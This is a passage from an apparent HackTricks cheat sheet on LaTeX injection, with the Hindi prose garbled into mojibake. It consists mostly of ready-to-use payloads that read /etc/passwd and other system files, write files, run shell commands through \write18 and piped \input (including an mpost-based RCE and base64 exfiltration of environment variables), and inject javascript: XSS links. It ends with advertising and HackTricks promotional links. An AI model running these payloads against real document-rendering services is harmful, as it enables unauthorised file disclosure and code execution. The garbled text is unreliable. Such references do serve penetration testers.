\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### рдПрдХрд▓ рд░реЗрдЦрд╛рдВрдХрд┐рдд рдлрд╝рд╛рдЗрд▓ рдкрдврд╝реЗрдВ
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### рдПрдХрд╛рдзрд┐рдХ рдкрдВрдХреНрддрд┐рдпреЛрдВ рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓ рдкрдврд╝реЗрдВ
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### рдлрд╝рд╛рдЗрд▓ рд▓рд┐рдЦреЗрдВ <a href="#write-file" id="write-file"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрди <a href="#command-execution" id="command-execution"></a>

рдХрдорд╛рдВрдб рдХрд╛ рдЗрдирдкреБрдЯ stdin рдкрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЗрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЯреЗрдореНрдк рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
рдпрджрд┐ рдЖрдкрдХреЛ рдХреЛрдИ рд▓реЗрдЯреЗрдХ рддреНрд░реБрдЯрд┐ рдорд┐рд▓рддреА рд╣реИ, рддреЛ рдмреЗрд╕64 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкрд░рд┐рдгрд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдВред
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### рдХреНрд░реЙрд╕ рд╕рд╛рдЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ <a href="#cross-site-scripting" id="cross-site-scripting"></a>

[@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## рдЧреЛрд╕реНрдЯрд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди

**рдЬрд╛рдВрдЪ рдХрд░реЗрдВ [https://blog.redteam-pentesting.de/2023/ghostscript-overview/](https://blog.redteam-pentesting.de/2023/ghostscript-overview/)**

## рд╕рдВрджрд░реНрдн

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

рд╡реЗ рд╕реБрд░рдХреНрд╖рд╛ рдЧрдбрд╝рдмрдбрд╝реА рдЦреЛрдЬреЗрдВ рдЬреЛ рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рдорд╛рдпрдиреЗ рд░рдЦрддреА рд╣реИ рддрд╛рдХрд┐ рдЖрдк рдЙрдиреНрд╣реЗрдВ рддреЗрдЬреА рд╕реЗ рдареАрдХ рдХрд░ рд╕рдХреЗрдВред рдЗрдВрдЯреНрд░реВрдбрд░ рдЖрдкрдХреЗ рд╣рдорд▓реЗ рдХреНрд╖реЗрддреНрд░ рдХрд╛ рдЯреНрд░реИрдХ рдХрд░рддрд╛ рд╣реИ, рдкреНрд░реЛрдПрдХреНрдЯрд┐рд╡ рдзрд╛рд░рдгрд╛ рд╕реНрдХреИрди рдЪрд▓рд╛рддрд╛ рд╣реИ, рдЖрдкрдХреА рдкреВрд░реА рддрдХрдиреАрдХреА рд╕реНрдЯреИрдХ, API рд╕реЗ рд╡реЗрдм рдРрдкреНрд╕ рдФрд░ рдХреНрд▓рд╛рдЙрдб рд╕рд┐рд╕реНрдЯрдо рддрдХ, рдореЗрдВ рдореБрджреНрджреЗ рдЦреЛрдЬрддрд╛ рд╣реИред [**рдпрд╣ рдирд┐: рд╢реБрд▓реНрдХ рдЖрдЬрд╝рдорд╛рдПрдВ**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) рдЖрдЬ рд╣реАред

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>
